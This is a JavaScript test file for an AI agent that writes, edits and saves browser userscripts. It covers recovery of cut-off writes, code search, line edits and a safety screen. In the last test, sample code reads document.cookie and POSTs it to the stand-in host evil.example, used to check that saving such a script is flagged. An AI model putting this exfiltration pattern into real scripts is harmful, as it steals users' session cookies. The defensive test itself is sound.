import test from 'node:test';
import assert from 'node:assert/strict';
import {streamText, tool, isStepCount} from 'ai';
import {MockLanguageModelV4} from 'ai/test';
import {z} from 'zod';
import {createLoader, invoke, plain} from './load-ts.mjs';

const load = createLoader();
const recovery = load('src/agent/run/writeRecovery.ts');
const codeFiles = load('src/agent/tools/codeFileText.ts');

function memoryFiles(initial = {}) {
    const files = new Map(Object.entries(initial));
    return {files, access: {read: async path => files.get(path) ?? null, write: async (path, content) => { files.set(path, content); }}};
}

function fixture({files = new Map(), scripts = []} = {}) {
    const storage = {
        loadScripts: async () => scripts,
        loadScriptsByConversation: async () => scripts,
        saveScript: async script => {
            const index = scripts.findIndex(s => s.id === script.id);
            if (index >= 0) scripts[index] = script; else scripts.unshift(script);
        },
        readFile: async (_, path) => files.get(path) ?? null,
        writeFile: async (_, path, content) => { files.set(path, content); },
        fileExists: async (_, path) => files.has(path),
        listFiles: async () => [...files.keys()],
        deleteFile: async (_, path) => { files.delete(path); },
    };
    const loader = createLoader({mocks: {'src/storage/scripts.ts': storage, 'src/storage/codeFiles.ts': storage}});
    return {files, scripts, loader, tools: loader('src/agent/tools/createAgentTools.ts').createAgentTools({conversationId: 'test'})};
}

const numberedCode = count => Array.from({length: count}, (_, i) => `  const value${i} = ${i};`).join('\n');

// ── Reading part-written arguments ──────────────────────────

test('partial fields decode up to the last whole character, wherever the cut lands', () => {
    const {partialStringField: field} = recovery;
    assert.deepEqual(plain(field('{"reason":"Write it","path":"a.js"', 'path')), {value: 'a.js', complete: true});
    assert.deepEqual(plain(field('{"file_text":"one\\ntwo', 'file_text')), {value: 'one\ntwo', complete: false});
    // Cut inside an escape, a unicode escape, and right after an escaped backslash.
    assert.equal(field('{"file_text":"one\\', 'file_text').value, 'one');
    assert.equal(field('{"file_text":"one\\u00', 'file_text').value, 'one');
    assert.equal(field('{"file_text":"a\\\\', 'file_text').value, 'a\\');
    assert.equal(field('{"file_text":"say \\"path\\": \\"nope\\"', 'path'), undefined);
    assert.equal(field('{"reason":"x"', 'file_text'), undefined);
});

// ── Keeping what a cut-off reply wrote ──────────────────────

test('a cut-off create saves its whole lines and leaves the broken last line out', async () => {
    const {files, access} = memoryFiles();
    const tracker = recovery.createWriteTracker(access);
    tracker.start('c1', 'createFileTool');
    tracker.delta('c1', '{"reason":"Write the script","path":"scripts/a.js","file_text":"function a() {\\n  one();\\n  tw');
    tracker.call('c1', 'createFileTool', '{"reason":"Write the script","path":"scripts/a.js","file_text":"function a() {\\n  one();\\n  tw', true);
    tracker.failed('c1');
    const [report] = await tracker.settle({cutOff: true});
    assert.equal(files.get('scripts/a.js'), 'function a() {\n  one();');
    assert.equal(report.kind, 'saved');
    assert.equal(report.complete, false);
    assert.equal(report.totalLines, 2);
    assert.equal(report.args.reason, 'Write the script');
    assert.deepEqual(plain(await tracker.settle({cutOff: true})), []);
});

test('a cut-off append adds to the file, and pieces join on a new line', async () => {
    const {files, access} = memoryFiles({'scripts/a.js': 'first'});
    const tracker = recovery.createWriteTracker(access);
    tracker.start('c1', 'appendToFile');
    tracker.delta('c1', '{"path":"scripts/a.js","text":"second\\nthird\\nfou');
    const [report] = await tracker.settle({cutOff: true});
    assert.equal(files.get('scripts/a.js'), 'first\nsecond\nthird');
    assert.equal(report.totalLines, 3);
    assert.equal(report.savedLines, 2);
});

test('a cut-off create never overwrites a file that already exists', async () => {
    const {files, access} = memoryFiles({'scripts/a.js': 'keep me'});
    const tracker = recovery.createWriteTracker(access);
    tracker.start('c1', 'createFileTool');
    tracker.delta('c1', '{"path":"scripts/a.js","file_text":"other\\nstuff\\n');
    const [report] = await tracker.settle({cutOff: true});
    assert.equal(report.kind, 'exists');
    assert.equal(files.get('scripts/a.js'), 'keep me');
    assert.ok(recovery.reportResult(report).error);
});

test('a whole write the SDK refused to run on a cut-off step is saved whole', async () => {
    const {files, access} = memoryFiles();
    const tracker = recovery.createWriteTracker(access);
    tracker.start('c1', 'createFileTool');
    tracker.delta('c1', '{"path":"a.js","file_text":"whole"}');
    tracker.call('c1', 'createFileTool', {path: 'a.js', file_text: 'whole'});
    const [report] = await tracker.settle({cutOff: true});
    assert.equal(files.get('a.js'), 'whole');
    assert.equal(report.complete, true);
    assert.equal(recovery.interruptedNote([report]), undefined);
});

test('a stop never repeats a whole write, since it may already have run, but keeps a half-written one', async () => {
    const {files, access} = memoryFiles();
    const tracker = recovery.createWriteTracker(access);
    tracker.start('whole', 'appendToFile');
    tracker.call('whole', 'appendToFile', {path: 'a.js', text: 'ran already'});
    tracker.start('half', 'createFileTool');
    tracker.delta('half', '{"path":"b.js","file_text":"one\\ntwo');
    const reports = await tracker.settle({cutOff: false});
    assert.equal(reports.length, 1);
    assert.equal(files.has('a.js'), false);
    assert.equal(files.get('b.js'), 'one');
    assert.match(recovery.interruptedNote(reports), /do not start the file over/);
});

test('finished calls and earlier steps leave nothing to settle, and unrelated unfinished calls change nothing', async () => {
    const {files, access} = memoryFiles();
    const tracker = recovery.createWriteTracker(access);
    tracker.start('c1', 'createFileTool');
    tracker.call('c1', 'createFileTool', {path: 'a.js', file_text: 'x'});
    tracker.resolved('c1');
    tracker.start('c2', 'appendToFile');
    tracker.delta('c2', '{"path":"a.js","text":"one\\ntwo');
    tracker.stepStart();
    assert.deepEqual(plain(await tracker.settle({cutOff: true})), []);
    tracker.start('c3', 'strReplaceTool');
    tracker.delta('c3', '{"path":"a.js","old_str":"x","new_str":"y');
    const [report] = await tracker.settle({cutOff: true});
    assert.equal(report.kind, 'not-run');
    assert.equal(files.size, 0);
    assert.match(recovery.cutOffNote([report], {kept: false, reasoning: ''}), /strReplaceTool on a\.js: changed nothing/);
});

test('the note says exactly where to carry on, and what thinking was already done', async () => {
    const {access} = memoryFiles();
    const tracker = recovery.createWriteTracker(access);
    tracker.start('c1', 'createFileTool');
    tracker.delta('c1', `{"path":"scripts/a.js","file_text":${JSON.stringify(`${numberedCode(400)}\nbroken li`).slice(0, -1)}`);
    const reports = await tracker.settle({cutOff: true});
    const note = recovery.cutOffNote(reports, {kept: false, reasoning: 'Use a MutationObserver.'});
    assert.match(note, /400 lines are saved/);
    assert.match(note, /const value399 = 399;/);
    assert.ok(!note.includes('value100'), 'only the tail of the file is sent back');
    assert.ok(!note.includes('broken li'));
    assert.match(note, /appendToFile/);
    assert.match(note, /Do not start over/);
    assert.match(note, /Use a MutationObserver\./);
    assert.match(recovery.cutOffNote([], {kept: false, reasoning: ''}), /thinking used up the limit/);
    assert.match(recovery.cutOffNote([], {kept: true, reasoning: ''}), /without repeating/);
});

// ── The whole loop, against the real SDK ────────────────────

const USAGE = {inputTokens: {total: 1}, outputTokens: {total: 1}};
const scripted = parts => ({stream: new ReadableStream({start(controller) {
    parts.forEach(part => controller.enqueue(part));
    controller.close();
}})});
const toolStream = (id, name, raw, finish) => [
    {type: 'stream-start', warnings: []},
    {type: 'reasoning-start', id: 'r'}, {type: 'reasoning-delta', id: 'r', delta: 'Plan: hide the banner.'}, {type: 'reasoning-end', id: 'r'},
    {type: 'tool-input-start', id, toolName: name}, {type: 'tool-input-delta', id, delta: raw}, {type: 'tool-input-end', id},
    {type: 'tool-call', toolCallId: id, toolName: name, input: raw},
    {type: 'finish', usage: USAGE, finishReason: {unified: finish, raw: finish}},
];

test('a cut-off write stops the step, and the next pass appends instead of starting again', async () => {
    const {files, access} = memoryFiles();
    const prompts = [];
    const replies = [
        toolStream('c1', 'createFileTool', '{"reason":"Write","path":"scripts/a.js","file_text":"line 1\\nline 2\\nline', 'length'),
        toolStream('c2', 'appendToFile', '{"reason":"Write on","path":"scripts/a.js","text":"line 3"}', 'tool-calls'),
        [{type: 'stream-start', warnings: []}, {type: 'text-start', id: 't'}, {type: 'text-delta', id: 't', delta: 'Done'}, {type: 'text-end', id: 't'},
            {type: 'finish', usage: USAGE, finishReason: {unified: 'stop', raw: 'stop'}}],
    ];
    const model = new MockLanguageModelV4({doStream: async options => {
        prompts.push(options);
        return scripted(replies.shift());
    }});
    const tools = {
        createFileTool: tool({inputSchema: z.object({reason: z.string(), path: z.string(), file_text: z.string()}), execute: async () => assert.fail('a cut-off call must not run')}),
        appendToFile: tool({inputSchema: z.object({reason: z.string(), path: z.string(), text: z.string()}),
            execute: async ({path, text}) => { files.set(path, codeFiles.appendChunk(files.get(path) ?? null, text)); return {success: true}; }}),
    };

    const tracker = recovery.createWriteTracker(access);
    const low = {anthropic: {effort: 'low'}};
    let messages = [{role: 'user', content: 'Hide the banner'}];
    let carryingOn = false;
    let passes = 0;
    while (true) {
        passes++;
        let cutOff = false;
        const carrying = carryingOn;
        const result = streamText({
            model, messages, tools,
            stopWhen: [isStepCount(5), ({steps}) => steps.at(-1)?.finishReason === 'length'],
            prepareStep: ({responseMessages}) => (carrying && responseMessages.length === 0) || recovery.lastStepAppended(responseMessages) ? {providerOptions: low} : {},
        });
        for await (const part of result.stream) {
            if (part.type === 'start-step') tracker.stepStart();
            else if (part.type === 'tool-input-start') tracker.start(part.id, part.toolName);
            else if (part.type === 'tool-input-delta') tracker.delta(part.id, part.delta);
            else if (part.type === 'tool-call') tracker.call(part.toolCallId, part.toolName, part.input, part.invalid);
            else if (part.type === 'tool-result') tracker.resolved(part.toolCallId);
            else if (part.type === 'tool-error') tracker.failed(part.toolCallId);
            else if (part.type === 'finish' && part.finishReason === 'length') cutOff = true;
        }
        if (!cutOff) break;
        const reports = await tracker.settle({cutOff: true});
        const {messages: kept, reasoning} = recovery.withoutCutOffStep((await result.response).messages);
        messages = [...messages, ...kept, {role: 'user', content: recovery.cutOffNote(reports, {kept: false, reasoning})}];
        carryingOn = true;
        assert.ok(passes < 3);
    }

    assert.equal(passes, 2);
    assert.equal(prompts.length, 3, 'the cut-off step is not retried by the SDK');
    assert.equal(files.get('scripts/a.js'), 'line 1\nline 2\nline 3');

    const resumed = prompts[1].prompt;
    const text = JSON.stringify(resumed);
    assert.ok(!resumed.some(message => message.role === 'tool'), 'no error result for the cut-off call');
    assert.ok(!text.includes('"tool-call"'), 'no tool call left without a result');
    assert.match(text, /2 lines are saved/);
    assert.match(text, /line 2/);
    assert.match(text, /Plan: hide the banner\./);
    assert.deepEqual(prompts[0].providerOptions, undefined);
    assert.equal(prompts[1].providerOptions?.anthropic?.effort, 'low');
    assert.equal(prompts[2].providerOptions?.anthropic?.effort, 'low');
});

test('a cut-off step keeps its visible text but none of its thinking or calls', () => {
    const response = [
        {role: 'assistant', content: [{type: 'tool-call', toolCallId: 'a', toolName: 'x', input: {}}]},
        {role: 'tool', content: [{type: 'tool-result', toolCallId: 'a', toolName: 'x', output: {type: 'text', value: 'ok'}}]},
        {role: 'assistant', content: [{type: 'reasoning', text: 'thought'}, {type: 'text', text: 'Partial answer'}, {type: 'tool-call', toolCallId: 'b', toolName: 'x', input: {}}]},
        {role: 'tool', content: [{type: 'tool-result', toolCallId: 'b', toolName: 'x', output: {type: 'error-text', value: 'invalid'}}]},
    ];
    const {messages, kept, reasoning} = recovery.withoutCutOffStep(response);
    assert.equal(messages.length, 3);
    assert.deepEqual(plain(messages[2]), {role: 'assistant', content: 'Partial answer'});
    assert.equal(kept, true);
    assert.equal(reasoning, 'thought');
    assert.equal(recovery.withoutCutOffStep([{role: 'assistant', content: [{type: 'reasoning', text: 'only thinking'}]}]).messages.length, 0);
});

// ── Writing and finding code ────────────────────────────────

test('long files build up piece by piece', async () => {
    const {tools, files} = fixture();
    assert.equal((await invoke(tools, 'createFileTool', {path: 'scripts/a.js', file_text: 'one\ntwo'})).output.lines, 2);
    const added = (await invoke(tools, 'appendToFile', {path: 'scripts/a.js', text: 'three\nfour'})).output;
    assert.equal(added.addedLines, 2);
    assert.equal(added.totalLines, 4);
    assert.equal(files.get('scripts/a.js'), 'one\ntwo\nthree\nfour');
    assert.match((await invoke(tools, 'createFileTool', {path: 'scripts/a.js', file_text: 'again'})).output.error, /appendToFile/);
});

test('search finds code in a huge file without reading it', async () => {
    const code = `${numberedCode(5000)}\nfunction hideBanner() {\n  banner.remove();\n}`;
    const {tools} = fixture({files: new Map([['a.js', code]])});
    const {output, projected} = await invoke(tools, 'viewCodeFiles', {path: 'a.js', query: 'hideBanner'});
    assert.equal(output.matches, 1);
    assert.match(output.content, /5001\tfunction hideBanner/);
    assert.match(output.content, /5002\t {2}banner\.remove/);
    assert.ok(JSON.stringify(projected ?? output).length < 400);
    assert.equal((await invoke(tools, 'viewCodeFiles', {path: 'a.js', query: '/value49\\d\\d =/'})).output.matches, 100);
    assert.equal((await invoke(tools, 'viewCodeFiles', {path: 'a.js', query: '(unbalanced'})).output.matches, 0);
    const many = (await invoke(tools, 'viewCodeFiles', {path: 'a.js', query: 'const'})).output;
    assert.equal(many.truncated, true);
    assert.ok(JSON.stringify(many.content).length <= 5000);
});

test('a view stays small enough to read in one result, however long the lines', async () => {
    const wide = Array.from({length: 120}, (_, i) => `line${i} ${'x'.repeat(200)}`).join('\n');
    const {tools, loader} = fixture({files: new Map([['a.js', wide], ['min.js', 'y'.repeat(50000)]])});
    const runtime = loader('src/agent/tools/toolRuntime.ts').createToolRuntime(tools, {request: 'script', findPrevious: () => undefined});
    const first = await invoke(runtime.tools, 'viewCodeFiles', {path: 'a.js', end_line: -1});
    assert.equal(first.output.truncated, true);
    assert.ok(first.output.nextStartLine > 1 && first.output.nextStartLine < 120);
    assert.ok(!first.projected.value.includes('"archived":true'), 'not archived behind a preview');
    const next = (await invoke(runtime.tools, 'viewCodeFiles', {path: 'a.js', start_line: first.output.nextStartLine})).output;
    assert.equal(next.viewedRange[0], first.output.nextStartLine);
    const minified = await invoke(runtime.tools, 'viewCodeFiles', {path: 'min.js'});
    assert.match(minified.output.content, /line clipped, 50000 chars/);
    assert.ok(!minified.projected.value.includes('"archived":true'));
});

test('line edits replace without retyping and refuse stale numbers', async () => {
    const {tools, files} = fixture({files: new Map([['a.js', 'one\ntwo\nthree\nfour']])});
    const edit = input => invoke(tools, 'replaceLines', {path: 'a.js', ...input}).then(r => r.output);
    assert.match((await edit({start_line: 2, end_line: 3, first_line: 'not this', new_text: 'x'})).error, /stale/);
    assert.equal(files.get('a.js'), 'one\ntwo\nthree\nfour');
    const done = await edit({start_line: 2, end_line: 3, first_line: '  two  ', new_text: 'TWO\nTHREE\nMORE'});
    assert.equal(done.removedLines, 2);
    assert.equal(done.addedLines, 3);
    assert.equal(done.totalLines, 5);
    assert.match(done.around, /2\tTWO/);
    assert.equal(files.get('a.js'), 'one\nTWO\nTHREE\nMORE\nfour');
    // Insert before a line, insert past the end, delete.
    await edit({start_line: 1, end_line: 0, first_line: 'one', new_text: 'zero'});
    await edit({start_line: 7, end_line: 6, first_line: '', new_text: 'end'});
    await edit({start_line: 2, end_line: 2, first_line: 'one'});
    assert.equal(files.get('a.js'), 'zero\nTWO\nTHREE\nMORE\nfour\nend');
    assert.match((await edit({start_line: 99, end_line: 99, first_line: ''})).error, /outside/);
    assert.match((await edit({start_line: 2, end_line: 99, first_line: 'TWO'})).error, /outside/);
});

test('the outline finds where things start', () => {
    const outline = codeFiles.outlineCode(`// ── Setup ──
function main() {
    const a = 1;
    const helper = () => a;
    function inner() {}
    return helper() + a;
}
class Widget {}
async function load() {}
`);
    for (const expected of ['1\t// ── Setup', '2\tfunction main', '4\t    const helper', '5\t    function inner', '8\tclass Widget', '9\tasync function load']) {
        assert.ok(outline.includes(expected), expected);
    }
    assert.ok(!outline.includes('const a = 1'));
    assert.ok(!outline.includes('return helper'));
});

// ── Editing a saved script ──────────────────────────────────

const savedScript = (code, extra = {}) => ({id: 'script-abcdef', conversationId: 'other-chat', name: 'Hide Banner!', description: 'Hides it',
    code, urlMatchPattern: 'https://example.com/*', status: 'paused', runAt: 'document_end', ...extra});

test('opening a large saved script returns a map, not the code', async () => {
    const code = `function main() {\n${numberedCode(3000)}\n}`;
    const {tools, files, loader} = fixture({scripts: [savedScript(code)]});
    const runtime = loader('src/agent/tools/toolRuntime.ts').createToolRuntime(tools, {request: 'script', findPrevious: () => undefined});
    const {output, projected} = await invoke(runtime.tools, 'openScript', {scriptId: 'script-abcdef'});
    assert.equal(output.path, 'scripts/hide-banner.js');
    assert.equal(files.get('scripts/hide-banner.js'), code);
    assert.equal(output.totalLines, 3002);
    assert.equal(output.content, undefined);
    assert.match(output.outline, /1\tfunction main/);
    assert.ok(projected.value.length < 1500, `sent ${projected.value.length} chars for a ${code.length}-char script`);
});

test('opening a short saved script returns its code straight away', async () => {
    const {tools} = fixture({scripts: [savedScript('function a() {\n  b();\n}')]});
    const {output} = await invoke(tools, 'openScript', {scriptId: 'script-abcdef'});
    assert.match(output.content, /2\t {2}b\(\);/);
    assert.equal(output.outline, undefined);
});

test('opening keeps unsaved edits unless told to reset, and never takes another script\'s file', async () => {
    const linked = savedScript('saved code', {sourcePath: 'scripts/mine.js'});
    const {tools, files} = fixture({scripts: [linked], files: new Map([['scripts/mine.js', 'edited code']])});
    const open = input => invoke(tools, 'openScript', {scriptId: 'script-abcdef', ...input}).then(r => r.output);
    const kept = await open();
    assert.ok(kept.differsFromSaved);
    assert.equal(files.get('scripts/mine.js'), 'edited code');
    const reset = await open({reset: true});
    assert.equal(reset.differsFromSaved, undefined);
    assert.equal(files.get('scripts/mine.js'), 'saved code');

    const taken = fixture({scripts: [savedScript('saved code')], files: new Map([['scripts/hide-banner.js', 'someone else']])});
    const other = (await invoke(taken.tools, 'openScript', {scriptId: 'script-abcdef'})).output;
    assert.equal(other.path, 'scripts/hide-banner-script.js');
    assert.equal(taken.files.get('scripts/hide-banner.js'), 'someone else');
    assert.match((await invoke(tools, 'openScript', {scriptId: 'missing'})).output.error, /listScripts/);
});

test('an edit goes from open to saved in place without the whole file passing through the model', async () => {
    const code = `function main() {\n${numberedCode(3000)}\n  banner.remove();\n}`;
    const userscript = {version: '1.0', grants: []};
    const {tools, scripts, files} = fixture({scripts: [savedScript(code, {userscript})]});
    const {path} = (await invoke(tools, 'openScript', {scriptId: 'script-abcdef'})).output;
    const found = (await invoke(tools, 'viewCodeFiles', {path, query: 'banner.remove'})).output;
    assert.equal(found.matches, 1);
    assert.equal((await invoke(tools, 'strReplaceTool', {path, old_str: 'banner.remove();', new_str: 'banner.hidden = true;'})).output.success, true);
    const saved = (await invoke(tools, 'saveScript', {path, scriptId: 'script-abcdef'})).output;
    assert.equal(saved.updated, true);
    assert.equal(saved.scriptId, 'script-abcdef');
    assert.equal(scripts.length, 1);
    const [script] = scripts;
    assert.ok(script.code.includes('banner.hidden = true;'));
    assert.ok(!script.code.includes('banner.remove'));
    // Everything the user set stays as it was.
    assert.equal(script.status, 'paused');
    assert.equal(script.runAt, 'document_end');
    assert.equal(script.urlMatchPattern, 'https://example.com/*');
    assert.equal(script.name, 'Hide Banner!');
    assert.equal(script.conversationId, 'other-chat');
    assert.equal(script.userscript, userscript);
    assert.equal(script.sourcePath, path);
    assert.ok(files.has(path), 'the working file stays');
});

test('saving a file again updates what it was saved as, and a new script still needs a name', async () => {
    const {tools, scripts, files} = fixture({files: new Map([['scripts/a.js', 'v1']])});
    const save = input => invoke(tools, 'saveScript', {path: 'scripts/a.js', ...input}).then(r => r.output);
    assert.match((await save({})).error, /needs a name/);
    const first = await save({name: 'A', scriptDescription: 'Does A', urlMatchPattern: 'https://a.com/*'});
    assert.equal(first.updated, undefined);
    assert.equal(scripts[0].sourcePath, 'scripts/a.js');
    assert.equal(scripts[0].runAt, 'document_idle');
    assert.equal(scripts[0].status, 'active');
    files.set('scripts/a.js', 'v2');
    const second = await save({name: 'A'});
    assert.equal(second.scriptId, first.scriptId);
    assert.equal(second.updated, true);
    assert.equal(scripts.length, 1);
    assert.equal(scripts[0].code, 'v2');
    assert.equal(scripts[0].urlMatchPattern, 'https://a.com/*');
    assert.match((await save({scriptId: 'gone'})).error, /listScripts/);
    assert.match((await save({scriptId: first.scriptId, urlMatchPattern: 'nope'})).error, /Invalid URL/);
});

test('a script that would delete other scripts\' UI is not saved, but its own cleanup is', async () => {
    const wipes = [
        `document.querySelectorAll('[data-ts-ui]').forEach(e => e.remove());`,
        `for (const n of document.querySelectorAll("[data-ts-ui]")) n.remove();`,
        'document.querySelector(`[data-ts-ui]`)?.remove();',
    ];
    const keeps = [
        `document.querySelectorAll('[data-ts-ui="acme-css"],[data-ts-ui="acme-app"]').forEach(e => e.remove());`,
        `const count = document.querySelectorAll('[data-ts-ui]').length; ${'/* unrelated */ '.repeat(8)} popup.remove();`,
    ];
    for (const code of wipes) {
        const {tools, scripts} = fixture({files: new Map([['scripts/a.js', code]])});
        const {output} = await invoke(tools, 'saveScript', {path: 'scripts/a.js', name: 'A', urlMatchPattern: 'https://a.com/*'});
        assert.match(output.error, /other scripts/, code);
        assert.equal(scripts.length, 0, code);
    }
    for (const code of keeps) {
        const {tools, scripts} = fixture({files: new Map([['scripts/a.js', code]])});
        const {output} = await invoke(tools, 'saveScript', {path: 'scripts/a.js', name: 'A', urlMatchPattern: 'https://a.com/*'});
        assert.equal(output.success, true, code);
        assert.equal(scripts.length, 1, code);
    }
});

test('listings give the size and working file of each script', async () => {
    const {tools} = fixture({scripts: [savedScript('a\nb', {sourcePath: 'scripts/x.js'})]});
    assert.equal((await invoke(tools, 'listScripts')).output.scripts[0].lines, 2);
    const detailed = (await invoke(tools, 'listScripts', {responseFormat: 'detailed'})).output.scripts[0];
    assert.equal(detailed.path, 'scripts/x.js');
});

// ── What a later message starts with ────────────────────────

test('a chat with code starts with its tools on and knows what is there', () => {
    const {tools, loader} = fixture();
    const {createToolRuntime} = loader('src/agent/tools/toolRuntime.ts');
    const plainRun = createToolRuntime(tools, {request: 'make that button blue instead', findPrevious: () => undefined});
    assert.ok(!plainRun.activeTools().includes('openScript'));
    const codeRun = createToolRuntime(tools, {request: 'make that button blue instead', extraGroups: ['scripting'], findPrevious: () => undefined});
    for (const name of ['openScript', 'appendToFile', 'replaceLines', 'saveScript']) assert.ok(codeRun.activeTools().includes(name), name);
    assert.match(codeRun.initialGuidance, /appendToFile/);

    assert.equal(codeFiles.codeContextNote([], []), '');
    const note = codeFiles.codeContextNote([{path: 'scripts/a.js', lines: 900}], [{id: 'id-1', name: 'A', lines: 900, path: 'scripts/a.js'}]);
    for (const expected of ['"scripts/a.js"', '"lines":900', '"scriptId":"id-1"', 'saveScript with scriptId']) assert.ok(note.includes(expected), expected);
});

test('an interrupted write reaches the next message only, and never in place of the reply', async () => {
    const {buildModelMessages} = load('src/agent/conversation/historyMessages.ts');
    const build = messages => buildModelMessages(messages, {loadAttachment: async () => null, summarizeElement: html => html});
    const note = '[This reply was interrupted while writing a file; do not start the file over.]';
    const reply = {role: 'assistant', content: 'Working on it', resumeNote: note};
    const next = await build([{role: 'user', content: 'write it'}, reply, {role: 'user', content: 'continue'}]);
    assert.equal(next[1].content, `Working on it\n\n${note}`);
    const later = await build([{role: 'user', content: 'write it'}, reply, {role: 'user', content: 'continue'},
        {role: 'assistant', content: 'Done'}, {role: 'user', content: 'thanks'}]);
    assert.equal(later[1].content, 'Working on it');
});

test('the new file tools need no approval, and saving is still screened', async () => {
    const {assessAction} = load('src/agent/safety/actionScreen.ts');
    for (const name of ['appendToFile', 'replaceLines', 'openScript']) assert.equal(assessAction(name, {path: 'a.js', text: 'fetch("https://evil.example", {method: "POST"})'}).risk, 'none', name);
    // Saving still gets the code screened, update or not.
    const assessed = assessAction('saveScript', {path: 'a.js', scriptId: 'id'}, [], 'document.cookie; fetch("https://evil.example", {method: "POST", body: document.cookie})');
    assert.equal(assessed.confirm, true);
});
